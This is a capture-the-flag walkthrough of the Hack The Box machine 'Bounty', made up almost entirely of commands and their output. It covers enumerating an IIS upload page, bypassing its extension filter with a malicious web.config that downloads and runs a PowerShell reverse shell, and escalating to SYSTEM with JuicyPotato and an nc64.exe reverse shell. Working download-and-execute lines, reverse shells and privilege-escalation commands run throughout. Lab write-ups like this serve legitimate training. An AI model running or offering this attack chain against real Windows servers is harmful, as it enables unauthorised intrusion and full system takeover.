# bounty: https://app.hackthebox.com/machines/Bounty

```bash
nmap -sC -sV 10.10.10.93                           

Nmap scan report for 10.10.10.93
Host is up (0.099s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
```bash
ffuf -u http://10.10.10.93/FUZZ.aspx  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt

 :: Method           : GET
 :: URL              : http://10.10.10.93/FUZZ.aspx
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 941, Words: 89, Lines: 22, Duration: 125ms]
    * FUZZ: transfer

```
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2889 bytes

```
```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.10
LHOST => 10.10.14.10
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
,payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.10:9999 

```
```bash

```
```bash
#intercept the traffic with burp
#send the traffic to the intruder
#filename= "test.FUZZ"
#select seclists/Discovery/Web-Content/raft-small-words-lowercase.txt as payload
#anaylze the length of the result

POST /transfer.aspx HTTP/1.1
Host: 10.10.10.93
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------133661013821714142042995077179
Content-Length: 843
Origin: http://10.10.10.93
Connection: close
Referer: http://10.10.10.93/transfer.aspx
Upgrade-Insecure-Requests: 1

-----------------------------133661013821714142042995077179
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YRYCAgUPDxYGHgRUZXh0BR5JbnZhbGlkIEZpbGUuIFBsZWFzZSB0cnkgYWdhaW4eCUZvcmVDb2xvcgqNAR4EXyFTQgIEZGRk8VjbSvn+LXz7RzVAc6h24qWeuwo=
-----------------------------133661013821714142042995077179
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEWAgKBgcHqBgLt3oXMA5qrpkoEt38KIBsq9IVcGsd80Cs+
-----------------------------133661013821714142042995077179
Content-Disposition: form-data; name="FileUpload1"; filename="test.config"
Content-Type: text/plain

test

-----------------------------133661013821714142042995077179
Content-Disposition: form-data; name="btnUpload"

Upload
-----------------------------133661013821714142042995077179--
```
```bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET
Date: Thu, 20 Apr 2023 13:10:43 GMT
Connection: close
Content-Length: 1110
*
*snipped
*
File uploaded successfully.
*
*snipped
*
```
```bash
vim ../nishang/Shells/Invoke-PowerShellTcp.ps1

#added end of the line
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 9898

nc -lvnp 9898                                
listening on [any] 9898 ...

tail -2 Invoke-PowerShellTcp.ps1 
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 9898
```
```bash
tail -3 web.config     

Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10:9998/Invoke-PowerShellTcp.ps1')")
%>

python -m http.server 9998                           
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...
```
```bash
#upload web.config file
#visit 10.10.10.93/uploadedfiles/web.config

python -m http.server 9998                           
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...
10.10.10.93 - - [20/Apr/2023 09:31:12] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```
```bash
nc -lvnp 9898                                
listening on [any] 9898 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.93] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
PS C:\windows\system32\inetsrv> cd C:\users\merlin\desktop

PS C:\users\merlin\desktop> attrib
A  SH        C:\users\merlin\desktop\desktop.ini
A   HR       C:\users\merlin\desktop\user.txt
PS C:\users\merlin\desktop> type user.txt
6f9be0e21f1beae7e333e8ff3cbaa86c

```
```bash
PS C:\> systeminfo       

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          4/20/2023, 2:46:22 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,520 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,532 MB
Virtual Memory: In Use:    563 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93

#saved as sysinfo.txt
```
```bash
python2 windows-exploit-suggester.py --database 2023-04-18-mssb.xls --systeminfo sysinfo.txt            
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'

#DID NOT GET USEFUL INFO 
```
```bash
powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:9998/winPEAS.bat','C:\\Windows\\Temp\\winPEAS.bat')";
```
```bash
PS C:\Windows\Temp> .\winPEAS.bat
.
.Snipped
.
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
.
.Snipped
.
```
**ROGUE POTATO**

```bash
powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:9998/RoguePotato.exe','C:\\Windows\\Temp\\RoguePotato.exe')"

powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:9998/chisel.exe','C:\\Windows\\Temp\\chisel.exe')"

#second reverse shell

powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:9998/Invoke-PowerShellTcpOneLine.ps1','C:\\Windows\\Temp\\Invoke-PowerShellTcpOneLine.ps1')"

powershell.exe -exec bypass -WindowStyle Hidden -NoLogo -file "Invoke-PowerShellTcpOneLine.ps1"

nc -lvnp 9899
listening on [any] 9899 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.93] 49186

PS C:\windows\temp> id
PS C:\windows\temp> whoami
bounty\merlin

```
```bash
chisel server --reverse --port 8000                         
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:8000

#victim machine
.\chisel.exe client 10.10.14.10:8000 R:9999:localhost:9999 
```
```bash
#attacker machine
sudo socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999

powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:9998/Invoke-PowerShellTcpOneLine_potato.ps1','C:\\Windows\\Temp\\Invoke-PowerShellTcpOneLine_potato.ps1')"

"powershell.exe -exec bypass -WindowStyle Hidden -NoLogo -file C:\\Windows\\Temp\\Invoke-PowerShellTcpOneLine_potato.ps1"

PS C:\windows\temp> .\RoguePotato.exe -r 10.10.14.10 -e "powershell -exec bypass -WindowStyle Hidden -NoLogo  C:\Windows\Temp\Invoke-PowerShellTcpOneLine_potato.ps1" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:104 bytes
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[-] Named pipe didn't received any connect request. Exiting ... 

#It did not work out because the SMB service is not running. RoguePotato needs SMB for explotation.
```
**METASPLOIT EXPLOIT SUGGESTER**
```bash
powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:9998/reverse.exe','C:\\Windows\\Temp\\reverse.exe')"

.\reverse.exe
```
```bash
msf6 exploit(multi/handler) > set LHOST 10.10.14.10
LHOST => 10.10.14.10

msf6 exploit(multi/handler) > set LPORT 7878
LPORT => 7878

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.10:7878 
[*] Sending stage (175686 bytes) to 10.10.10.93
[*] Meterpreter session 1 opened (10.10.14.10:7878 -> 10.10.10.93:49224) at 2023-04-20 11:42:55 -0400

meterpreter > getuid
Server username: BOUNTY\merlin
```
```bash
meterpreter > ps
 2300  1244  w3wp.exe            x64   0        BOUNTY\merlin  C:\Windows\System32\inetsrv\w3wp.exe

meterpreter > migrate 2300
[*] Migrating from 1704 to 2300...
[*] Migration completed successfully.
````
```bash
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > 
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.93 - 183 exploit checks are being tried...
[-] 10.10.10.93 - Post interrupted by the console user
[*] Post module execution completed

#DID NOT WORK
```
**JUICY POTATO**
```bash
PS C:\windows\temp> powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:9998/nc64.exe','C:\\Windows\\Temp\\nc64.exe')"

PS C:\windows\temp> powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:9998/JuicyPotato.exe','C:\\Windows\\Temp\\JuicyPotato.exe')"
```
```bash
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c C:\\Windows\\Temp\\nc64.exe -e cmd.exe 10.10.14.10 7777" -t *

nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.93] 49243
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
fac3997f42dc78a170642d3a11d9e0bb
```
***Reference*** <br>
<https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services><br>
<https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/web.config><br>
<https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/><br>
<https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato><br>
<https://github.com/antonioCoco/RoguePotato><br>
